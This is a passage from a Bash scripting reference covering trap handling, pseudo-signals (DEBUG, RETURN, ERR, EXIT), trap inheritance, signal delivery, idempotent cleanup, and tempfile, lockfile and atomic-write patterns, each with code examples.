installed. This is the canonical trap-quoting rule (§12.5).

### DEBUG

Fires *before* every simple command. The handler runs with the
about-to-execute command in `$BASH_COMMAND`; if the handler returns a
non-zero status and `extdebug` is on, the command is *skipped*. This
is the mechanism behind `set -x` (xtrace) and tools like
`bashdb`. Stepping, breakpointing, and pre-command instrumentation
all hang off DEBUG.

DEBUG is *not* inherited by functions or subshells unless `set -T`
(`functrace`) is also set. Inside loops, DEBUG fires once per
iteration's body command, *not* once per loop. Pipeline components
each fire DEBUG in their own subshells (with `-T`).

```bash
# scenario: DEBUG trap as a tracer
#!/usr/bin/env bash
set -uo pipefail; set -T               # functrace; not -e for the demo
shopt -s inherit_errexit shift_verbose extglob nullglob

trace() { printf >&2 '+ %s:%d %s\n' "${BASH_SOURCE[1]##*/}" "$1" "$BASH_COMMAND"; }
trap 'trace $LINENO' DEBUG

greet() {
  local -- name="$1"
  echo "Hello, $name"
}
greet world
# ⇒ trace fires before each command:
# + script.bash:13 greet world
# + script.bash:9  local -- name="$1"
# + script.bash:10 echo "Hello, $name"
```

In production scripts, DEBUG is rarely installed permanently — it is a
heavy hook (one handler invocation per command). For end-user
tracing, prefer `set -x` (or `BASH_XTRACEFD=`) which is implemented
on top of the same machinery but with built-in formatting.

### RETURN

Fires when a shell function returns or a sourced script (`.` /
`source`) finishes loading. Useful for "leave-function" instrumentation
and for sourced-library teardown. Like DEBUG, RETURN is not inherited
into functions unless `set -T`.

`$?` inside RETURN holds the function's (or sourced script's) exit
status; `FUNCNAME[0]` (in the trap, indexes shift) identifies the
returning function.

```bash
# scenario: RETURN trap as a function-leave tracer
#!/usr/bin/env bash
set -uo pipefail; set -T
shopt -s inherit_errexit shift_verbose extglob nullglob

leave() {
  local -i rc=$?                       # FIRST line: capture
  printf >&2 '<- %s rc=%d\n' "${FUNCNAME[1]:-?}" "$rc"
  return "$rc"                          # do not mask original status
}
trap leave RETURN

work() { sleep 0.01; return 0; }
fail() { return 7; }
work; fail
# ⇒ <- work rc=0
# ⇒ <- fail rc=7
```

The `return "$rc"` discipline mirrors the EXIT-trap `exit "$rc"`
pattern: a trap handler must not silently overwrite the status it was
called to observe.

### Combining pseudo-signals

All four pseudo-signals can be installed simultaneously. The order of
firing for a failing command at top level is:

1. DEBUG fires (with the about-to-run command in `$BASH_COMMAND`).
2. The command runs, returns non-zero.
3. ERR fires (if not in an exempt context, §13.3).
4. errexit triggers; the shell proceeds toward exit.
5. RETURN fires for any in-progress function being unwound (with `-T`).
6. EXIT fires.

Each handler is independent; one handler's exit status does not
suppress the next. Handlers should be *defensive*: capture `$?` first,
do their job, restore the captured status with `return` / `exit`.

### Trap inspection

`trap -p` lists all installed traps with their handlers, including
pseudo-signals. `trap -p ERR` shows just the ERR trap. `trap -- '' NAME`
ignores a (real) signal — but pseudo-signals cannot be ignored; they
can only be re-set with a no-op handler (`trap : ERR` makes ERR a
silent observer).

### Practical guidance

Use EXIT for cleanup, ERR for error diagnostics, DEBUG for tracing
during development, RETURN for tearing down sourced libraries or
profiling function calls. EXIT and ERR belong in production scripts;
DEBUG and RETURN are diagnostic tools used selectively.

Pair ERR with `set -E` (§13.9) and EXIT with the captured-rc preamble
(`local -i rc=$?`). The BCS template (BCS0110) ships an EXIT-trap
skeleton that integrates with the strict-mode contract.

**See also**: §12.5 (trap builtin and quoting), §12.7 (`trap -p`),
§12.8 (trap inheritance), §12.12 (idempotent cleanup), §13.2
(errexit), §13.8 (ERR trap deep-dive), §13.9 (errtrace contract),
BCS0110 (cleanup and traps), BCS-bash `30_48_trap.md`.

## 12.7 `trap -p` and trap inspection

`trap -p` prints the current trap state in a form that can be re-eval'd.
It is the canonical "is my handler actually installed?" diagnostic and
the only built-in way to enumerate trap dispositions at runtime.

| Invocation | Output |
|------------|--------|
| `trap -p`              | every installed trap, one per line |
| `trap -p SIGNAL`       | just the named signal (empty if Default) |
| `trap -p SIG1 SIG2 …`  | each signal in turn |

`declare -p` does **not** report traps; only `trap -p` does. There is
also no `set -o` flag for traps and no `BASH_*` array exposing them.

```bash
# scenario: confirm traps after install
trap 'cleanup' EXIT
trap 'on_int $LINENO' INT
trap '' PIPE                                # ignored signal

trap -p
# ⇒ trap -- 'cleanup' EXIT
#   trap -- 'on_int $LINENO' INT
#   trap -- '' SIGPIPE

trap -p HUP
# ⇒ (empty — HUP is at its default disposition)
```

The output is in re-eval'able form: bash's own output is safe to feed
back through `eval` to restore traps after a section that disables them.

```bash
# scenario: snapshot and restore traps
saved_traps=$(trap -p)
trap - INT TERM                             # disable temporarily
risky_section
eval "$saved_traps"                         # restore exactly
```

Use `trap -p` to diagnose: "why didn't my trap fire?" (it may have
been reset by a later install), "which traps does this function
inherit?" (functions see whatever the shell has installed, regardless
of frame), and "is the EXIT trap the latest version?" (libraries that
own their cleanup re-install at entry and confirm via `trap -p EXIT`).

**See also**: §12.4 (signal disposition), §12.5 (the `trap` builtin),
§12.8 (trap inheritance), §12.9 (reset across exec), §12.12 (idempotent
cleanup), BCS-bash `30_48_trap.md`, BCS0603 (trap handling).

## 12.8 Trap inheritance

Whether a trap installed in the parent shell remains in force inside a
function, command substitution, or subshell depends on which trap and
which inheritance flag is set. The defaults are surprising — most
traps are *not* inherited — and the rules differ for real signals,
EXIT, ERR, and DEBUG/RETURN. This chapter is the canonical inheritance
matrix for the reference; §13.9 inlines the BCS strict-mode contract
that incorporates the relevant flags.

### Inheritance matrix

| Trap on | Function call | Command subst `$(…)` | Subshell `(…)` | Background `&` |
|---------|:-------------:|:--------------------:|:--------------:|:--------------:|
| Real signal (caught, e.g. `INT`) | inherited | inherited | inherited | reset to default ¹ |
| Real signal (ignored, `trap '' SIG`) | inherited | inherited | inherited | inherited |
| `EXIT` | parent only ² | subshell-local ³ | subshell-local | subshell-local |
| `ERR` | not inherited (use `set -E`) | not inherited (use `set -E`) | not inherited (use `set -E`) | not inherited (use `set -E`) |
| `DEBUG` | not inherited (use `set -T`) | not inherited (use `set -T`) | not inherited (use `set -T`) | not inherited (use `set -T`) |
| `RETURN` | not inherited (use `set -T`) | not inherited (use `set -T`) | not inherited (use `set -T`) | not inherited (use `set -T`) |

Notes:

1. Per `bash(1)` SIGNALS section: "When bash is waiting for an
   asynchronous command via the `wait` builtin, the reception of a
   signal for which a trap has been set will cause the `wait` builtin
   to return immediately with an exit status greater than 128,
   immediately after which the trap is executed." Background-process
   subshells reset *caught* (non-ignored) signals to default
   disposition; ignored signals (`trap '' SIG`) remain ignored.
2. Functions do not have their own EXIT trap. The script's EXIT trap
   fires once when the parent shell exits; function returns do not
   trigger EXIT (use RETURN, §12.6).
3. Each command-substitution shell has its own EXIT trap, defaulted
   to no-op. The parent's EXIT handler does *not* fire when the
   substitution ends — only when the parent itself exits.

The "use `set -E`" / "use `set -T`" cells are the actionable lever:
setting `errtrace` makes ERR cells become "inherited"; setting
`functrace` makes DEBUG and RETURN cells become "inherited".

### `set -E`, `set -T`, and `extdebug`

Three switches govern propagation of the bash-internal pseudo-signals:

| Switch | Long name | Effect |
|--------|-----------|--------|
| `set -E` | `errtrace` | ERR trap propagates to functions, command substitutions, and explicit subshells. |
| `set -T` | `functrace` | DEBUG and RETURN traps propagate to functions, command substitutions, and explicit subshells. |
| `shopt -s extdebug` | (no short flag) | Extends DEBUG: the handler's exit status can *abort* the command (return 2 means "skip this command"); also enables `BASH_ARGC`, `BASH_ARGV`, `BASH_LINENO`, `BASH_SOURCE` arrays for full call introspection; required for `bashdb`. |

`extdebug` is a tracing-only feature. Production scripts should not
enable it. It interacts with `set -T` and `set -E` cumulatively —
each adds a slice of inheritance and introspection.

### Real-signal inheritance subtlety

A real-signal trap behaves slightly differently than a pseudo-signal
trap. Inside a subshell or background process, *caught* signals are
reset to default disposition because the subshell is "asynchronous"
and the parent's handler context (e.g. shared state) may not be
appropriate. *Ignored* signals (`trap '' SIG`) remain ignored, by
POSIX rule, because resetting to default would be observable as a
behavioural change. A subshell wishing to handle a signal must
re-install its own trap.

```bash
# scenario: ERR trap propagation, with and without -E
#!/usr/bin/env bash
set -uo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

trap 'echo "ERR fired at $LINENO in ${FUNCNAME[1]:-MAIN}"' ERR

probe_no_E() { set +E; false; }        # function with -E off
probe_with_E() { set -E; false; }       # function with -E on

set +E; probe_no_E   || echo "after probe_no_E rc=$?"
# ⇒ after probe_no_E rc=1
# (ERR did NOT fire inside probe_no_E because -E is off)

set -E; probe_with_E || echo "after probe_with_E rc=$?"
# ⇒ after probe_with_E rc=1
# (with -E, ERR would fire inside probe_with_E whenever the false command
#  executes outside a tested-condition position — see §13.8 for the full
#  fire-vs-suppress matrix)
```

The asymmetry is the entire reason `set -E` exists. Library code that
installs an ERR trap *must* set `errtrace`, or accept that the trap is
silent inside any function call.

```bash
# scenario: subshell loses the parent's EXIT trap
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

trap 'echo "parent EXIT (pid=$$)"' EXIT

(
  echo "inside subshell (pid=$BASHPID)"
  # No EXIT trap here unless we install one explicitly.
  # Parent's EXIT will NOT fire when this subshell ends.
  exit 0
)
echo "after subshell"

# Subshell-local trap, if needed:
(
  trap 'echo "subshell EXIT (pid=$BASHPID)"' EXIT
  exit 0
)
# ⇒ inside subshell
# ⇒ after subshell
# ⇒ subshell EXIT
# ⇒ parent EXIT
# (PIDs vary; ordering is: subshell #1 body → parent statement → subshell #2
#  body → its own EXIT → script EXIT → parent's EXIT trap)
```

### `inherit_errexit` does *not* affect trap inheritance

A common misreading: `inherit_errexit` (§13.6) propagates *errexit*
into `$(…)`, but it has *no* effect on whether the ERR trap fires
there. ERR fires only if `set -E` is also set. The two flags
collaborate but are independent: `inherit_errexit` decides "does the
substitution exit on internal failure?", `errtrace` decides "does the
ERR trap run when it does?". For full diagnostic coverage, set both.

### Practical guidance

The BCS strict-mode contract (§13.9) does not include `set -E` /
`set -T` by default — those are tracing-aware additions. When a script
installs an ERR trap that *must* fire inside library functions
(BCS0407), upgrade the contract preamble to `set -eEuo pipefail`. The
EXIT trap pattern (§12.6, BCS0110) does not need any inheritance flag;
it is installed once at top level and naturally fires on shell exit.

For subshell cleanup, install a subshell-local EXIT trap explicitly.
Do not assume the parent's trap will run.

**See also**: §12.5 (trap builtin), §12.6 (pseudo-signals), §12.7
(`trap -p`), §12.9 (trap reset on exec), §13.2 (errexit), §13.6
(inherit_errexit), §13.8 (ERR trap), §13.9 (errtrace contract),
BCS0101 (strict mode), BCS0110 (cleanup and traps), BCS-bash
`30_43_set.md`, BCS-bash `30_45_shopt.md`.

## 12.9 Trap reset across `exec`

`execve(2)` replaces the current process image with a new program. The
kernel's POSIX-mandated rule for what happens to the signal disposition
table at this point depends on whether each signal was *caught* or
*ignored*:

| Disposition before `exec` | After `exec` |
|--------------------------|--------------|
| **Caught** (handler installed) | **Default** (handler discarded — the new program would not know how to run it) |
| **Ignored** (`SIG_IGN`) | **Ignored** (preserved — the new program may be unable to override its parent's choice) |
| **Default**            | **Default** (unchanged) |

This asymmetry is intentional and not configurable from user space:
inherited *ignores* are how a parent shell can permanently silence a
signal across an `exec` chain (e.g. setuid wrappers ignoring SIGINT),
while inherited *handlers* would be unreloadable address-space junk.

```bash
# scenario: ignored vs caught reset on exec
trap 'echo "HUP caught"' HUP              # Caught
trap '' PIPE                              # Ignored
exec bash -c 'trap -p HUP PIPE'
# ⇒ trap -- '' SIGPIPE
# (the ignore on PIPE survived the exec; the caught handler on HUP was
#  reset to default, so `trap -p HUP` prints nothing)
```

The same rule applies to bash's `exec` builtin: handlers installed in
the wrapper are wiped on `exec realprog`, but ignores stick. A normal
`bash -c '…'` is `fork+exec` — the parent keeps its traps, only the
child loses caught handlers. `exec PROG` (no `&`) replaces the calling
shell entirely, so the calling shell's traps are gone for good.

For "child must ignore SIGINT" hardening, install the ignore in the
parent (handlers do not survive but ignores do). Library code must
re-install its own traps in the new image — it cannot rely on the
parent's.

**See also**: §12.4 (signal disposition), §12.5 (`trap` builtin), §12.7
(`trap -p` inspection), §12.8 (trap inheritance), §11.13 (environment
inheritance), BCS-bash `30_21_exec.md`, BCS-bash `30_48_trap.md`,
BCS0603 (trap handling).

## 12.10 Synchronous vs asynchronous delivery

Bash does not interrupt itself in mid-command. Asynchronous signals
(SIGINT, SIGTERM, SIGHUP, SIGUSR1, …) are queued by the shell and
delivered only at command boundaries. Synchronous signals (SIGSEGV,
SIGFPE) — which the process raises against itself by faulting — are
delivered the instant they occur, but bash scripts almost never
encounter them.

The practical consequence is the **sleep-trap classic**: a trap
installed for SIGINT will not fire while bash is blocked inside an
external command, because bash itself is parked in a `wait()` syscall.
Only when the child returns does control come back to bash, at which
point the queued trap fires.

### The classic walkthrough

```bash
# scenario: SIGINT during a long external command
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

trap 'echo "caught INT"; exit 130' INT

echo "press Ctrl-C now…"
sleep 1000                         # bash is parked in wait()
echo "after sleep"                 # ⇒ never reached if INT was sent
```

What actually happens when the user presses Ctrl-C:

1. The kernel sends SIGINT to the **foreground process group** —
   *both* the shell and the `sleep` child receive it.
2. `sleep` has the default disposition (terminate); it dies with status
   130 (128 + signal 2).
3. Bash's `wait()` returns. Bash *now* notices its own queued SIGINT.
4. The INT trap fires, prints `caught INT`, and the script exits 130.

The user sees a near-instant response, but the response was driven by
the kernel killing the child, not by the trap interrupting bash. The
trap's role was post-mortem.

If the foreground command *catches* SIGINT itself and ignores it, the
shell still has its own queued SIGINT and the trap fires only when the
child eventually exits for some other reason. This is a frequent source
of "Ctrl-C does nothing" bugs in scripts that run interactive children
(editors, pagers, ssh) — the child is consuming the signal.

### Wait-and-invert idiom

To make a long external command *itself* respond to SIGINT while still
running a trap in the parent, run the command in the background and
have bash `wait` for it explicitly. `wait` is the one foreground builtin
that *is* interruptible by traps: an asynchronous signal causes `wait`
to return immediately (with status 128 + signum) and the trap then
fires inside the parent. The child can be left to die naturally or
killed by the trap.

```bash
# scenario: wait-and-invert — Ctrl-C reaches us promptly, child cleaned up
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -i CHILD=0

cleanup() {
  local -i rc=$?
  (( CHILD )) && kill -TERM "$CHILD" 2>/dev/null
  wait "$CHILD" 2>/dev/null || true
  exit "$rc"
}
trap cleanup INT TERM EXIT

long_running &                     # background — bash returns immediately
CHILD=$!                            # capture PID for the trap (§11.5)

wait "$CHILD"                       # interruptible: traps fire here
echo "child finished cleanly"
```

The pattern's three load-bearing pieces:

- **`cmd &` then `wait $!`** — bash is no longer in `wait()` on the
  child *directly*; it is in the `wait` *builtin*, which is built to be
  interrupted.
- **PID captured in a global** — `$!` is per-job and would be lost if
  the trap ran in a different context; assigning it to `CHILD` makes
  it available to the cleanup handler.
- **`kill` then `wait` in cleanup** — TERM the child, then wait for it
  to finish so no zombies are left behind. The `2>/dev/null || true`
  guards handle the race where the child has already exited.

This is the single most useful pattern for any script that wraps a
long-running external command and must respond to SIGINT/SIGTERM in
real time. It is also the foundation of the timeout-without-`timeout(1)`
pattern (§12.16, BCS1104).

### When SIGCHLD matters

Bash sets a default SIGCHLD handler when job control is on. Scripts
running with `set -m` (or interactively) receive SIGCHLD when any child
exits, which interrupts `wait` precisely as above. Non-interactive
scripts with job control off still see the same `wait`-interruption
behaviour for the signals they trap; they just don't get the SIGCHLD
notification *for untrapped* child exits.

A script that installs its own SIGCHLD handler is rare and usually
wrong — it competes with bash's reaper. Prefer `wait -n` (§11.5,
BCS1103) to consume child exits one at a time without trapping CHLD.

### Strict-mode interaction

Under `set -e`, a trap-driven `exit "$rc"` from inside `wait` preserves
the failing status. Without the explicit `exit`, the trap returns
normally and the script proceeds — usually not what is wanted. Always
end signal-handling cleanup paths with `exit "$rc"` (BCS0110, BCS0603).

**See also**: §12.5 (trap builtin), §12.11 (signal-safe code), §12.16
(SIGHUP reload), §11.5 (foreground vs background, `wait -n`),
BCS0110, BCS0603, BCS1101, BCS1103, BCS1104, BCS-bash `24_SIGNALS.md`.

## 12.11 Signal-safe code

A signal handler runs in the same shell as the script that installed
it. Anything the handler does competes with whatever the main script
was doing, in the shell's own state. The C concept of *async-signal
safety* — the short list of syscalls a handler may invoke without
deadlock or reentrancy — translates into bash as a similar short list
of operations a `trap` handler may perform without surprising itself or
the main flow.

### What is unsafe

| Operation | Why it is unsafe |
|-----------|------------------|
| `read` | Race against pending stdin or readline state; partial reads on EINTR |
| `wait` (with no PID) | Can deadlock if the trapped signal arrives during the wait |
| Subshell pipelines (`a \| b`) | Each component is a fork; signal may arrive mid-fork |
| Long external commands | Defer further trap handling until they return |
| Recursive trap invocation | Same signal during handler may be coalesced or dropped |
| Modifying global state without a lock | Main flow may be mid-update of the same variable |

Bash itself protects most of its critical sections — variable
assignments, pipeline setup, internal command execution — by deferring
asynchronous signal delivery to the next safe point (§12.10). What it
does *not* protect is your handler's interaction with the main script's
shared state. A handler that runs `pkg=$(some_lookup)` while the main
flow is also doing `pkg=…` is a data race even if neither line is
itself dangerous.

### What is safe

- Simple variable assignment: `STOP=1`, `caught_sig=$1`.
- `printf` / `echo` to stderr (file descriptors are reentrant enough).
- `kill` of a known PID (the kernel serialises).
- Calling functions whose own bodies obey the same rules.
- `exit "$rc"` — the canonical handler-terminator.
- Re-installing the trap (a no-op in bash; included for portability).

The unifying principle: **set a flag; let the main loop act on it.**
The handler is a notification, not a worker.

### The flag-and-defer pattern

The textbook approach to a slow handler is to defer the work to the
main loop. The handler does the minimum necessary — capture the signal,
mark intent — and returns. The main loop polls the flag at safe points
and does the actual work in the script's normal control flow.

```bash
# scenario: graceful shutdown of a long-running worker loop
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -i STOP=0
declare -i RELOAD=0

on_term() { STOP=1; }              # tiny handler: flag-set only
on_hup()  { RELOAD=1; }            # tiny handler: flag-set only

trap on_term INT TERM
trap on_hup  HUP

reload_config() {
  RELOAD=0                          # clear flag *first* (race: another HUP wins next loop)
  source -- /etc/myapp/config.conf  # heavy work, but in main flow
}

reload_config
while (( ! STOP )); do
  (( RELOAD )) && reload_config
  process_one_unit_of_work          # short; checks flag often
done

cleanup_and_exit                    # in main flow, not a handler
```

The signal arrives, sets the flag, returns. The main loop notices
within one iteration and runs the (potentially slow) reload from a
context that is allowed to do anything.

Two subtle disciplines worth calling out:

- **Clear the flag before acting on it.** If a second SIGHUP arrives
  during `reload_config`, you want the *next* loop iteration to reload
  again, not for the in-progress reload to swallow it.
- **Make the inner work-unit short.** The flag is checked once per
  iteration; long inner work delays shutdown.

### Coalescing and queue depth

POSIX guarantees that *at least one* delivery happens for an
unblocked signal that was raised, but not that every raise produces a
separate delivery. Bash inherits this: a flurry of fifty SIGUSR1s in
a millisecond may produce a single trap fire. Handlers must therefore
be **idempotent** — a flag-set handler is naturally idempotent
(`STOP=1` is the same after one fire or fifty), which is a second
reason the pattern wins.

### Re-installing inside the handler

Some POSIX C signal APIs reset a handler to default after firing,
requiring re-installation inside the handler itself. Bash does **not**
do this — `trap` installs a *persistent* disposition. Re-installing
inside the handler is harmless but unnecessary; remove it from any
script ported from sh or C.

### Handler-from-handler

If a second signal of a *different* kind arrives while a handler is
running, bash queues it and runs it after the current handler returns.
The handlers do not nest. This is normally what you want, but it means
a handler that itself calls `sleep` or any blocking operation is
delaying *all* other trap handling for the duration.

### Strict-mode interaction

Under `set -e`, a non-zero exit inside a handler propagates: a `kill`
returning non-zero (because the target already exited) will errexit
the handler. Guard with `|| true`:

```bash
# scenario: signal-safe child reaping in cleanup
cleanup() {
  local -i rc=$?
  (( CHILD )) && kill -TERM "$CHILD" 2>/dev/null || true
  wait "$CHILD" 2>/dev/null || true
  exit "$rc"
}
```

`set -u` is equally relevant: a handler that references an unset
variable will errexit and skip the rest of the cleanup. Use the
`${var:-}` default-expansion form when reading globals that may not
yet be set when the handler fires (BCS0110).

**See also**: §12.5 (trap builtin), §12.6 (pseudo-signals), §12.10
(synchronous vs asynchronous delivery), §12.12 (idempotent cleanup),
§12.16 (SIGHUP reload), BCS0110, BCS0603, BCS1101, BCS-bash
`24_SIGNALS.md`, `30_48_trap.md`.

## 12.12 Idempotent cleanup patterns

A cleanup handler attached to multiple signals (`trap cleanup EXIT INT
TERM HUP`) can fire more than once: SIGINT may arrive *during* an
ongoing cleanup, the EXIT trap then runs again, and so on. Idempotent
handlers tolerate this by guarding against re-entry and by checking
each resource's existence before acting.

There are two canonical guards. Use either; do not mix.

### Pattern 1 — sentinel variable

A flag distinguishes the first invocation from subsequent ones. The
`${_CLEANED:-}` form uses parameter expansion's default (empty) so the
guard works under `set -u` (BCS0101) where reading an unset variable
would otherwise abort.

```bash
# scenario: re-entrant trap protected by a sentinel
cleanup() {
  [[ -n ${_CLEANED:-} ]] && return        # second + later calls: no-op
  _CLEANED=1                              # first call claims the work
  [[ -d $tmpdir ]] && rm -rf -- "$tmpdir" # exists-check before remove
  exec 9>&-                               # release lock fd
}
trap cleanup EXIT INT TERM HUP            # any of these triggers it
```

Per-resource existence checks (`[[ -d $tmpdir ]]`) matter as much as
the sentinel: another pass may have already removed the resource, and
`rm -rf` against a missing path under `set -e` aborts the rest of
cleanup.

### Pattern 2 — disable the trap on entry

Reset every signal back to default before doing the work. Subsequent
deliveries of those signals then take their default action (terminate)
without re-entering the handler. This is simpler than a sentinel but
forfeits the chance to catch a re-entrant signal at all.

```bash
# scenario: handler disables itself before doing work
cleanup() {
  trap - EXIT INT TERM HUP                 # disable further invocations
  [[ -d $tmpdir ]] && rm -rf -- "$tmpdir"
  exec 9>&-
}
trap cleanup EXIT INT TERM HUP
```

Use this form when the cleanup is short and re-entry would be a bug;
use the sentinel form when the handler itself may take noticeable time
and you want second SIGINTs to be politely ignored rather than to kill
the script mid-cleanup.

### Capturing `$?` in the handler

The EXIT trap fires after the failing command sets `$?`, so a single
handler can log the failing exit status without losing it:

```bash
cleanup() {
  local rc=$?                              # capture before doing anything
  [[ -n ${_CLEANED:-} ]] && return
  _CLEANED=1
  [[ -d $tmpdir ]] && rm -rf -- "$tmpdir"
  (( rc )) && error "exiting with rc=$rc"
  return "$rc"                             # preserve script's exit status
}
trap cleanup EXIT
```

The `return "$rc"` is critical: without it, the handler's last command
becomes the script's exit status. A bare `[[ -d $tmpdir ]]` returning
non-zero would change a successful script's exit code from 0 to 1.

For multi-resource cleanup, push each step onto an array and iterate
in reverse-acquisition order in the handler, with `|| true` per step
so one failure does not abort the rest of the cleanup.

**See also**: §12.5 (`trap` builtin), §12.6 (pseudo-signals — EXIT
mechanics), §12.13 (tempfile lifecycle), §12.14 (lockfile pattern),
§12.15 (atomic file write), BCS0110 (cleanup and traps), BCS0603 (trap
handling).

## 12.13 Tempfile and tempdir lifecycle

The canonical pattern: allocate a tempdir with `mktemp -d`, install an
EXIT trap that removes it, work inside it. The trap fires on any normal
exit — completion, `exit N`, or any caught signal that bash terminates
on after running its handler.

```bash
# scenario: single-tempdir lifecycle
tmpdir=$(mktemp -d -t myscript-XXXXXX) || die 1 "mktemp failed"
trap 'rm -rf -- "$tmpdir"' EXIT
```

- `mktemp -d` for directories; `mktemp` (no `-d`) for a single file.
- Use `-t TEMPLATE` with at least 6 `X`s. The Xs are replaced with
  random characters; `-t` honours `TMPDIR` (defaulting to `/tmp`).
- `mktemp -p DIR` chooses a specific parent if `TMPDIR` is unsuitable
  (e.g. small tmpfs vs working filesystem).
- The trap removes the directory recursively; combine with
  `set -euo pipefail` so a failure in setup short-circuits before the
  trap is installed.

### Multiple tempdirs — array cleanup

A script that allocates several tempdirs (one per worker, one per
phase, etc.) keeps them in an array and iterates in the cleanup
handler. The `nullglob` shopt (BCS0101) makes the unset-array case
safe to expand.

```bash
# scenario: multi-tempdir array cleanup
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -a tmpdirs=()

mk_tmp() {
  local d
  d=$(mktemp -d -t "myscript-${1:-x}-XXXXXX") || die 1 "mktemp failed"
  tmpdirs+=("$d")
  printf '%s\n' "$d"
}

cleanup() {
  local d
  for d in "${tmpdirs[@]}"; do
    [[ -d $d ]] && rm -rf -- "$d"
  done
}
trap cleanup EXIT

a=$(mk_tmp build)                          # /tmp/myscript-build-XXXXXX
b=$(mk_tmp cache)                          # /tmp/myscript-cache-XXXXXX
c=$(mk_tmp work)                           # /tmp/myscript-work-XXXXXX

# … use $a $b $c …
# trap removes all three on exit, regardless of which one we were using
# when the script ended.
```

The pattern composes with the idempotent-cleanup guards of §12.12:
add a sentinel if the handler is also wired to INT/TERM, and put the
per-directory `[[ -d $d ]]` check inside the loop so a partial cleanup
does not abort under `set -e`.

### TMPDIR and security

`mktemp` honours `$TMPDIR` if set. Override with `TMPDIR=/var/tmp
mktemp -d -t …` when `/tmp` is unsuitable. **Never** construct paths
manually (`/tmp/myscript.$$`) — the PID is predictable and an attacker
can pre-place a symlink. For state that must survive the script, use
`${XDG_CACHE_HOME:-$HOME/.cache}/myscript/`, not `mktemp`.

**See also**: §12.5 (`trap` builtin), §12.12 (idempotent cleanup),
§12.14 (lockfile pattern), §12.15 (atomic file write), §13.10 (exit
code conventions), BCS0110 (cleanup and traps), BCS1006 (temporary
file handling).

## 12.14 Lockfile pattern

Mutual exclusion across script invocations. The canonical bash recipe
uses `flock(1)` from `util-linux` — an external command, not a bash
builtin — applied to a file descriptor held open for the script's
lifetime. The kernel releases the lock automatically when the
descriptor is closed (including when the process dies), so this pattern
survives `kill -9`.

```bash
# scenario: minimal exclusion lock
exec 9>"$lockfile"
flock -n 9 || die 1 "another instance is running"
```

| Flag | Meaning |
|------|---------|
| `-n`        | non-blocking (return non-zero immediately if locked) |
| `-w SEC`    | wait up to SEC seconds, then fail |
| (default)   | block forever |
| `-x`        | exclusive (default) |
| `-s`        | shared (read-style) lock |
| `-u`        | explicit unlock (rarely needed — closing the fd is enough) |

Two forms of `flock` are easy to confuse. The `exec 9>file; flock -n 9`
form holds the lock for the whole script; the `flock -n file cmd` form
runs `cmd` under the lock and releases when `cmd` exits. The first is
correct for "I am a running instance"; the second for "this one
operation must be atomic".

### Stale-lock and PID-write variant

`flock` *itself* never goes stale — the kernel reaps the lock when the
holder dies. But many shell scripts also write a PID file alongside the
lockfile so operators can identify the holder. The PID file *can* go
stale (e.g. if the script is `kill -9`'d and the PID is recycled). The
pattern below uses `flock` for correctness and a PID file as a
human-facing diagnostic, and tolerates a stale PID file from a previous
crash:

```bash
# scenario: lock + PID file with stale-PID handling
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- lockfile=/run/lock/myscript.lock pidfile=/run/myscript.pid

acquire_lock() {
  exec 9>"$lockfile"
  if ! flock -n 9; then
    # Another instance holds the kernel lock — try to identify it.
    if [[ -r $pidfile ]] && other=$(<"$pidfile") && kill -0 "$other" 2>/dev/null; then
      die 1 "already running as PID $other"
    fi
    # PID file is stale or unreadable, but the kernel lock is held —
    # so the running instance just hasn't written its PID yet.
    die 1 "another instance is starting up"
  fi

  # Lock acquired — write our PID. The PID file inherits the lock's
  # protection because we hold fd 9.
  printf '%s\n' "$$" >"$pidfile"
  trap 'rm -f -- "$pidfile"' EXIT          # PID file is best-effort
}

acquire_lock
# … work …
```

Notes on this variant:

1. The kernel-side `flock` is the source of truth; the PID file is
   advisory. Never make correctness depend on it.
2. `kill -0 $other` checks process existence without sending a signal
   (§11.10). It returns non-zero if the PID is gone or owned by another
   user.
3. Cleaning up the PID file on EXIT is best-effort: `kill -9` will
   leave it behind. The next run handles that case via the staleness
   probe.
4. Holding fd 9 across the whole script means the lock travels with
   the process; do not close fd 9 anywhere except in cleanup.

### Lock contention versus busy-wait

`flock -w 30` blocks up to 30 seconds and returns non-zero on timeout
— preferable to a shell-level retry loop because the kernel's wakeup
is immediate when the holder releases. The retry-loop form `until
flock -n 9; do sleep 1; done` is wasteful and occasionally races on
systems with overloaded kernel locks. Use `-w` whenever possible.

**See also**: §12.5 (`trap` builtin), §12.12 (idempotent cleanup),
§12.13 (tempfile lifecycle), §11.10 (`kill` and `-0` probe), BCS0110
(cleanup and traps), BCS1006 (temporary file handling).

## 12.15 Atomic file write

Write to a sibling tempfile in the *same* directory, then rename. The
`rename(2)` syscall is atomic on a single filesystem, so concurrent
readers see either the old version or the new version of the target —
never a half-written file.

```bash
# scenario: atomic-replace single file
tmp=$(mktemp -- "${target}.XXXXXX") || die 5 "mktemp failed"
write_data > "$tmp"
mv -- "$tmp" "$target"
```

- `mktemp -- "${target}.XXXXXX"` creates the tempfile *next to* the
  target, guaranteeing same-filesystem rename. **Do not** use
  `mktemp -t` here — that places the file in `/tmp`, which is usually
  a different filesystem.
- `mv` within one filesystem invokes `rename(2)` and is atomic.
- The reader either opens the inode that was the old file or the inode
  that becomes the new file. There is no observable mid-state.
- `sync` between the write and the `mv` is required only when crash
  durability matters (`man 2 fsync` for the rationale).

### The cross-filesystem trap

If `$tmp` and `$target` are on **different** filesystems, `mv` is not
a rename — it is a copy plus unlink. Concurrent readers can observe a
half-written file; the `rename(2)` syscall returns `EXDEV` and `mv`
silently falls back to copy mode.

```bash
# scenario: cross-fs mv is NOT atomic — stage in the target's dir
tmp=$(mktemp -t write-XXXXXX)              # WRONG — /tmp is a separate fs
mv -- "$tmp" "$target"                     # ⇒ copy + unlink (not atomic)

tmp=$(mktemp -- "${target}.XXXXXX")        # CORRECT — same dir, same fs
mv -- "$tmp" "$target"                     # ⇒ atomic rename(2)
```

To verify same-filesystem staging, compare device numbers — equality
means same fs:

```bash
